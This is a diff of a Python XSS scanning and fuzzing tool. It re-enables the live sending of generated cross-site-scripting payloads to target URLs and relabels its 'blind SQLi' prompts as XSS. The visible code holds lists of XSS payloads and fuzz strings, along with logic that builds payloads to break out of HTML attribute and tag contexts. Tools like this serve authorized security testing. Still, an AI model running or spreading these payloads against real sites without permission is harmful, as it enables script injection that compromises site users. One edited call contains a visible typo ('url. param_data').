@@ -74,7 +74,7 @@ fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%%00nload=yyy>', '<z oNStart=conf
 '">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
 '<bGsOund sRc=x>']
 
-payloads = [ # Payloads for blind sqli and simple bruteforcing
+payloads = [ # Payloads for blind xss and simple bruteforcing
 '\'"</Script><Html Onmouseover=(alert)(1) //'
 '<imG/sRc=l oNerrOr=(prompt)() x>',
 '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
@@ -320,7 +320,7 @@ def make_request(url, param_data, GET, POST): #The main function which actually 
             resp = br.open(url, param_data) #Makes request
             return resp.read() #Reads the output 
     except:
-        print "\n%s url is offline. \n%s Exiting..."
+        print '\n%s Target isn\'t responding.' % bad
         quit()
         
 class MyHTMLParser(HTMLParser):
@@ -474,8 +474,7 @@ def inject(url, param_data, GET, POST):
                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                     sys.stdout.flush()
                     payload = prefix + function + suffix
-                    print payload
-                    #test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, action='do')
+                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, action='do')
             test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url. param_data, GET, POST, action='do')
         
         elif location == 'html_data':
@@ -497,20 +496,17 @@ def inject(url, param_data, GET, POST):
                             sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                             sys.stdout.flush()
                             payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            print payload
-                            #test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
+                            test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
 
         elif location == 'start_end_tag_attr' or location == 'attr':
             print '%s Trying to break out of %sAttribute%s context.' % (run, green, end)
             quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
             
             if quote == '':
-                print 'Koi quote nhi h'
                 prefix = ['/>']
                 suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
             
             elif quote in allowed:
-                print 'Quote h bc'
                 prefix = '%s>' % quote
                 suffixes = ['<%s' % quote, '<br attr=%s' % quote]
                 progress = 0
@@ -523,11 +519,9 @@ def inject(url, param_data, GET, POST):
                                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                     sys.stdout.flush()
                                     payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    print payload
-                                    #test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
+                                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             
             elif quote not in allowed and 'entity' in allowed:
-                print 'Quote allowed nhi h'
                 prefix = ''
                 if quote == '\'':
                     prefix = '&apos;'
@@ -545,8 +539,7 @@ def inject(url, param_data, GET, POST):
                                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                     sys.stdout.flush()
                                     payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                    print payload
-                                    #test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
+                                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             else:
                 print '%s Quotes are being filtered, its not possible to break out of the context.' % bad
 
@@ -640,7 +633,7 @@ def initiator(url, GET, POST):
             current_param = current_param + 1
     
     if len(occur_number) == 0 and GET:
-        choice = raw_input('%s Execute project HULK for blind SQLi Detection? [Y/n]' % que).lower()
+        choice = raw_input('%s Execute project HULK for blind XSS Detection? [Y/n]' % que).lower()
         if choice == 'n':
             quit()
         else:
@@ -651,7 +644,7 @@ def initiator(url, GET, POST):
                 next = raw_input('%s Press enter to execute next payload' % que)
     
     elif len(occur_number) == 0 and POST:
-        choice = raw_input('%s Would you like to generate some payloads for blind SQLi? [Y/n]' % que).lower()
+        choice = raw_input('%s Would you like to generate some payloads for blind XSS? [Y/n]' % que).lower()
         if choice == 'n':
             quit()
         else:
